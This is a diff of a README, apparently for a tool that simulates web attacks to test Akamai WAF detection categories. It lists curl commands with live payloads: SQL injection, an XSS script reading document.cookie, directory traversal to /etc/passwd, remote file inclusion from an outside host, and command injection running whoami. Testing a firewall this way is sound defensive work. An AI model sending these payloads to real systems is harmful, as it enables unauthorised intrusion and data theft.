@@ -1,6 +1,31 @@
-# KSD Simulator
+# Akamai Bot Attacker
 
-## Web Attack Tool
+## 0x01. How It Works
+
+- Send request with python `requests`.
+
+## 0x02. Python Package
+
+- requests
+
+## 0x03. How To Use
+
+1. create an alias in shell rc/profile:
+
+    ``` bash
+    alias akattack="python3 ${AK_TOOLS_HOME}/05_bot_attacker/python/bot_attacker.py"
+    ```
+
+2. Reopen the terminal.
+3. Using following command to run the script.
+
+    ``` bash
+    akattack
+    ```
+
+## 0x04. Attack Type
+
+### 1. Web Attack Tool
 
 Identifies common application-level attack tools including vulnerability scanning, exploit tools and DoS programs like Pandora, Drive, LOIC, and Hulk.
 
@@ -11,7 +36,7 @@ This is an example request with a User-Agent string value of a well-known open s
 curl -D - -s "http://${HOSTNAME}/" --user-agent "w3af.sourceforge.net"
 ```
 
-## Web Protocal Attack
+### 2. Web Protocal Attack
 
 Identifies errors and anomalies related to the HTTP protocol including request body parsing errors and RFC violations like required request headers that are missing.
 
@@ -22,18 +47,19 @@ This is an example request where the Content-Type header specifies the request b
 curl -D - -s "http://${HOSTNAME}/" --header "Content-Type: application/xml" --data "not_xml_format"
 ```
 
-SQL Injection
+### 3. SQL Injection
 
 Identifies database attack payloads, including those used during the initial reconnaissance phase of an attack session to enumerate database details, as well as data exfiltration attempts and timing-based enumerations. The group evaluates incoming payloads using a library of attack fingerprints that our security research team updates continuously.
 
-Sample Attack Simulation:
+### 4. Sample Attack Simulation
+
 This is an example SQLi attack that attempts to enumerate the database version in use. You shouldn’t run attack simulations when the Penalty Box is set to Deny.
 
 ``` Bash
 curl -D - -s "http://${HOSTNAME}/?fakeparam=-1%20UNION%20ALL%20SELECT%20%40%40version%2C2%2C3--"
 ```
 
-## Cross-Site Scripting
+### 5. Cross-Site Scripting
 
 Blocks proof-of-concept attacks that attempt to identify exploit vectors, JavaScript event handler invocations, and attempts to access sensitive DOM objects.
 
@@ -44,13 +70,13 @@ This is an example XSS attack that attempts to trigger the JavaScript prompt fun
 curl -D - -s "http://${HOSTNAME}/?fakeparam=data%22%3E%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E"
 ```
 
-## Local File Inclusion
+### 6. Local File Inclusion
 
 ``` Bash
 curl -D - -s "http://${HOSTNAME}/?fakeparam=.././.././../etc/passwd"
 ```
 
-## Remote File Inclusion
+### 7. Remote File Inclusion
 
 Identifies attacks including directory traversals, as well as attempts to access sensitive application configuration and operating system files.
 
@@ -61,7 +87,7 @@ This is an example LFI attack that attempts to directory traversal to access the
 curl -D - -s "http://${HOSTNAME}/?fakeparam=http://cirt.net/rfiinc.txt"
 ```
 
-## Command Injection
+### 8. Command Injection
 
 Identifies attempts to access and execute application-level and operating system commands including PHP code injection and web Bash/backdoor upload attempts.
 
@@ -72,7 +98,7 @@ This is an example CMDi attack that attempts to use the “whoami” operating s
 curl -D - -s "http://${HOSTNAME}/?fakeparam=something;/bin/whoami"
 ```
 
-## Web Platform Attack
+### 9. Web Platform Attack
 
 Identifies attacks against the software platforms (including cloud, web and application-layers) that are not categorized in other attack groups.
 
